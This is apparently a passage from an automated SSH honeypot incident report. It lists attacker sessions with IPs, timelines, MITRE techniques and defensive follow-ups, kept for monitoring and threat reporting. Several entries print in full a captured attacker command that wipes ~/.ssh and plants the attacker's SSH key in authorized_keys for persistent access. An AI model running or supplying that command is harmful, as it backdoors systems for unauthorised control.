- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3806656af42

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 10:31 |
| **Last Seen** | 2026-06-10 10:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:31:34` | `cowrie.session.connect` |
| `2026-06-10 10:31:34` | `cowrie.client.version` |
| `2026-06-10 10:31:35` | `cowrie.client.kex` |
| `2026-06-10 10:31:35` | `cowrie.login.success` |
| `2026-06-10 10:31:36` | `cowrie.session.params` |
| `2026-06-10 10:31:36` | `cowrie.command.input` |
| `2026-06-10 10:31:36` | `cowrie.command.failed` |
| `2026-06-10 10:31:36` | `cowrie.log.closed` |
| `2026-06-10 10:31:36` | `cowrie.session.params` |
| `2026-06-10 10:31:36` | `cowrie.command.input` |
| `2026-06-10 10:31:36` | `cowrie.session.file_download` |
| `2026-06-10 10:31:36` | `cowrie.log.closed` |
| `2026-06-10 10:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a74617d30290

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 10:31 |
| **Last Seen** | 2026-06-10 10:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:31:39` | `cowrie.session.connect` |
| `2026-06-10 10:31:39` | `cowrie.client.version` |
| `2026-06-10 10:31:39` | `cowrie.client.kex` |
| `2026-06-10 10:31:40` | `cowrie.login.success` |
| `2026-06-10 10:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd383f681af9

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:32 |
| **Last Seen** | 2026-06-10 10:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:32:47` | `cowrie.session.connect` |
| `2026-06-10 10:32:47` | `cowrie.client.version` |
| `2026-06-10 10:32:47` | `cowrie.client.kex` |
| `2026-06-10 10:32:48` | `cowrie.login.success` |
| `2026-06-10 10:32:49` | `cowrie.session.params` |
| `2026-06-10 10:32:49` | `cowrie.command.input` |
| `2026-06-10 10:32:49` | `cowrie.log.closed` |
| `2026-06-10 10:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beea9fe3b335

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:32 |
| **Last Seen** | 2026-06-10 10:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:32:52` | `cowrie.session.connect` |
| `2026-06-10 10:32:52` | `cowrie.client.version` |
| `2026-06-10 10:32:53` | `cowrie.client.kex` |
| `2026-06-10 10:32:54` | `cowrie.login.success` |
| `2026-06-10 10:32:54` | `cowrie.session.params` |
| `2026-06-10 10:32:54` | `cowrie.command.input` |
| `2026-06-10 10:32:54` | `cowrie.log.closed` |
| `2026-06-10 10:32:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43fa3ddc6420

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:32 |
| **Last Seen** | 2026-06-10 10:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:32:57` | `cowrie.session.connect` |
| `2026-06-10 10:32:57` | `cowrie.client.version` |
| `2026-06-10 10:32:58` | `cowrie.client.kex` |
| `2026-06-10 10:32:58` | `cowrie.login.success` |
| `2026-06-10 10:32:59` | `cowrie.session.params` |
| `2026-06-10 10:32:59` | `cowrie.command.input` |
| `2026-06-10 10:32:59` | `cowrie.log.closed` |
| `2026-06-10 10:32:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52802a1a019f

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:00` | `cowrie.session.connect` |
| `2026-06-10 10:33:00` | `cowrie.client.version` |
| `2026-06-10 10:33:00` | `cowrie.client.kex` |
| `2026-06-10 10:33:01` | `cowrie.login.success` |
| `2026-06-10 10:33:02` | `cowrie.session.params` |
| `2026-06-10 10:33:02` | `cowrie.command.input` |
| `2026-06-10 10:33:02` | `cowrie.log.closed` |
| `2026-06-10 10:33:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-489d748489fe

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:03` | `cowrie.session.connect` |
| `2026-06-10 10:33:03` | `cowrie.client.version` |
| `2026-06-10 10:33:03` | `cowrie.client.kex` |
| `2026-06-10 10:33:04` | `cowrie.login.success` |
| `2026-06-10 10:33:05` | `cowrie.session.params` |
| `2026-06-10 10:33:05` | `cowrie.command.input` |
| `2026-06-10 10:33:05` | `cowrie.log.closed` |
| `2026-06-10 10:33:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c42ac05e1e45

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:11` | `cowrie.session.connect` |
| `2026-06-10 10:33:11` | `cowrie.client.version` |
| `2026-06-10 10:33:11` | `cowrie.client.kex` |
| `2026-06-10 10:33:12` | `cowrie.login.success` |
| `2026-06-10 10:33:13` | `cowrie.session.params` |
| `2026-06-10 10:33:13` | `cowrie.command.input` |
| `2026-06-10 10:33:13` | `cowrie.log.closed` |
| `2026-06-10 10:33:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c29b32fbdee

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:13` | `cowrie.session.connect` |
| `2026-06-10 10:33:13` | `cowrie.client.version` |
| `2026-06-10 10:33:14` | `cowrie.client.kex` |
| `2026-06-10 10:33:15` | `cowrie.login.success` |
| `2026-06-10 10:33:15` | `cowrie.session.params` |
| `2026-06-10 10:33:15` | `cowrie.command.input` |
| `2026-06-10 10:33:16` | `cowrie.log.closed` |
| `2026-06-10 10:33:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a659ae065e0e

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:19` | `cowrie.session.connect` |
| `2026-06-10 10:33:19` | `cowrie.client.version` |
| `2026-06-10 10:33:19` | `cowrie.client.kex` |
| `2026-06-10 10:33:20` | `cowrie.login.success` |
| `2026-06-10 10:33:21` | `cowrie.session.params` |
| `2026-06-10 10:33:21` | `cowrie.command.input` |
| `2026-06-10 10:33:21` | `cowrie.log.closed` |
| `2026-06-10 10:33:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-400385aa93d1

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:22` | `cowrie.session.connect` |
| `2026-06-10 10:33:22` | `cowrie.client.version` |
| `2026-06-10 10:33:22` | `cowrie.client.kex` |
| `2026-06-10 10:33:23` | `cowrie.login.success` |
| `2026-06-10 10:33:24` | `cowrie.session.params` |
| `2026-06-10 10:33:24` | `cowrie.command.input` |
| `2026-06-10 10:33:24` | `cowrie.log.closed` |
| `2026-06-10 10:33:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-720473dbdbba

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:24` | `cowrie.session.connect` |
| `2026-06-10 10:33:24` | `cowrie.client.version` |
| `2026-06-10 10:33:24` | `cowrie.client.kex` |
| `2026-06-10 10:33:25` | `cowrie.login.success` |
| `2026-06-10 10:33:26` | `cowrie.session.params` |
| `2026-06-10 10:33:26` | `cowrie.command.input` |
| `2026-06-10 10:33:26` | `cowrie.log.closed` |
| `2026-06-10 10:33:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e38c354b0139

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:26` | `cowrie.session.connect` |
| `2026-06-10 10:33:26` | `cowrie.client.version` |
| `2026-06-10 10:33:27` | `cowrie.client.kex` |
| `2026-06-10 10:33:28` | `cowrie.login.success` |
| `2026-06-10 10:33:28` | `cowrie.session.params` |
| `2026-06-10 10:33:28` | `cowrie.command.input` |
| `2026-06-10 10:33:29` | `cowrie.log.closed` |
| `2026-06-10 10:33:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54b4253e01b0

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:29` | `cowrie.session.connect` |
| `2026-06-10 10:33:29` | `cowrie.client.version` |
| `2026-06-10 10:33:30` | `cowrie.client.kex` |
| `2026-06-10 10:33:30` | `cowrie.login.success` |
| `2026-06-10 10:33:31` | `cowrie.session.params` |
| `2026-06-10 10:33:31` | `cowrie.command.input` |
| `2026-06-10 10:33:31` | `cowrie.log.closed` |
| `2026-06-10 10:33:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceff42086c6b

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:31` | `cowrie.session.connect` |
| `2026-06-10 10:33:31` | `cowrie.client.version` |
| `2026-06-10 10:33:32` | `cowrie.client.kex` |
| `2026-06-10 10:33:33` | `cowrie.login.success` |
| `2026-06-10 10:33:34` | `cowrie.session.params` |
| `2026-06-10 10:33:34` | `cowrie.command.input` |
| `2026-06-10 10:33:34` | `cowrie.log.closed` |
| `2026-06-10 10:33:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e753f900b93

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:34` | `cowrie.session.connect` |
| `2026-06-10 10:33:34` | `cowrie.client.version` |
| `2026-06-10 10:33:35` | `cowrie.client.kex` |
| `2026-06-10 10:33:36` | `cowrie.login.success` |
| `2026-06-10 10:33:36` | `cowrie.session.params` |
| `2026-06-10 10:33:36` | `cowrie.command.input` |
| `2026-06-10 10:33:37` | `cowrie.log.closed` |
| `2026-06-10 10:33:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-014b39e1ffe7

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:37` | `cowrie.session.connect` |
| `2026-06-10 10:33:37` | `cowrie.client.version` |
| `2026-06-10 10:33:37` | `cowrie.client.kex` |
| `2026-06-10 10:33:39` | `cowrie.login.success` |
| `2026-06-10 10:33:39` | `cowrie.session.params` |
| `2026-06-10 10:33:39` | `cowrie.command.input` |
| `2026-06-10 10:33:39` | `cowrie.log.closed` |
| `2026-06-10 10:33:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7607d7d53ed

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:38` | `cowrie.session.connect` |
| `2026-06-10 10:33:38` | `cowrie.client.version` |
| `2026-06-10 10:33:38` | `cowrie.client.kex` |
| `2026-06-10 10:33:39` | `cowrie.login.success` |
| `2026-06-10 10:33:39` | `cowrie.session.params` |
| `2026-06-10 10:33:39` | `cowrie.command.input` |
| `2026-06-10 10:33:39` | `cowrie.command.failed` |
| `2026-06-10 10:33:40` | `cowrie.log.closed` |
| `2026-06-10 10:33:40` | `cowrie.session.params` |
| `2026-06-10 10:33:40` | `cowrie.command.input` |
| `2026-06-10 10:33:40` | `cowrie.session.file_download` |
| `2026-06-10 10:33:40` | `cowrie.log.closed` |
| `2026-06-10 10:33:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cd70283fb82

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:40` | `cowrie.session.connect` |
| `2026-06-10 10:33:40` | `cowrie.client.version` |
| `2026-06-10 10:33:40` | `cowrie.client.kex` |
| `2026-06-10 10:33:41` | `cowrie.login.success` |
| `2026-06-10 10:33:42` | `cowrie.session.params` |
| `2026-06-10 10:33:42` | `cowrie.command.input` |
| `2026-06-10 10:33:42` | `cowrie.log.closed` |
| `2026-06-10 10:33:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3db2c787535a

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:42` | `cowrie.session.connect` |
| `2026-06-10 10:33:43` | `cowrie.client.version` |
| `2026-06-10 10:33:43` | `cowrie.client.kex` |
| `2026-06-10 10:33:44` | `cowrie.login.success` |
| `2026-06-10 10:33:44` | `cowrie.session.params` |
| `2026-06-10 10:33:44` | `cowrie.command.input` |
| `2026-06-10 10:33:44` | `cowrie.log.closed` |
| `2026-06-10 10:33:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e7c661e1e2b

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:43` | `cowrie.session.connect` |
| `2026-06-10 10:33:43` | `cowrie.client.version` |
| `2026-06-10 10:33:43` | `cowrie.client.kex` |
| `2026-06-10 10:33:43` | `cowrie.login.success` |
| `2026-06-10 10:33:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63d62ef6adb8

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:45` | `cowrie.session.connect` |
| `2026-06-10 10:33:45` | `cowrie.client.version` |
| `2026-06-10 10:33:45` | `cowrie.client.kex` |
| `2026-06-10 10:33:46` | `cowrie.login.success` |
| `2026-06-10 10:33:47` | `cowrie.session.params` |
| `2026-06-10 10:33:47` | `cowrie.command.input` |
| `2026-06-10 10:33:47` | `cowrie.log.closed` |
| `2026-06-10 10:33:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0b319861b38

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:47` | `cowrie.session.connect` |
| `2026-06-10 10:33:47` | `cowrie.client.version` |
| `2026-06-10 10:33:48` | `cowrie.client.kex` |
| `2026-06-10 10:33:49` | `cowrie.login.success` |
| `2026-06-10 10:33:49` | `cowrie.session.params` |
| `2026-06-10 10:33:49` | `cowrie.command.input` |
| `2026-06-10 10:33:50` | `cowrie.log.closed` |
| `2026-06-10 10:33:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d79c9c2e28f

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:50` | `cowrie.session.connect` |
| `2026-06-10 10:33:50` | `cowrie.client.version` |
